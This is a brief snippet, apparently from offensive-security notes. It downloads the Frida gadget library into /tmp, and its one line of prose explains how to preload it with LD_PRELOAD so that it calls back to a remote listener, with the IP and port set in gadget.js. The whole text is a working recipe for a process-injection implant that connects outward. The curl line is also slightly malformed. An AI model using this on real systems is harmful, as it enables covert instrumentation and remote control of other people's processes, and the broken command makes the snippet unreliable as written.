```bash
curl -Ls /tmp/gadget.so https://github.com/frida/frida/releases/download/12.3.1/frida-gadget-12.3.1-linux-x86_64.so.xz | unxz > /tmp/gadget.so
chmod +x /tmp/gadget.so
```
Frida-based LD_PRELOAD script that polls to listener when it initializes. Change IP/port in gadget.js and export LD_PRELOAD=/tmp/gadget.so.
